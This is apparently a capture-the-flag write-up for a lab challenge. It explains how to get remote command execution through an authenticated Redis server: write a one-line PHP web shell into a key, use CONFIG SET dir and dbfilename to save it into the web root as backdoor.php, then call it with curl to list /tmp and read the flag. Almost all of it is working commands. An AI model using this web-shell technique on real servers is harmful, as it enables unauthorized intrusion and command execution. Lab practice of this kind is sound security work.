
> [!NOTE] Problem
> Find FLAG at `/tmp/` on Redis Server


1. create `shell.txt`
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
```

2. inject to redis server
```bash
cat shell.txt | redis-cli -h $TARGET -a $PASSWORD -x set backdoor
```

3. go to redis server for config setting
```bash
redis-cli -h $TARGET -a $PASSWORD
```

```redis
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename "backdoor.php"
SAVE
```

4. let's get the flag
```bash
# check is backdoor is working ?
curl http:/$TARGET/backdoor.php?cmd=whoami

curl http://$TARGET/backdoor.php?cmd=ls%20/tmp/
curl http://$TARGET/backdoor.php?cmd=cat%20/tmp/flag.txt
```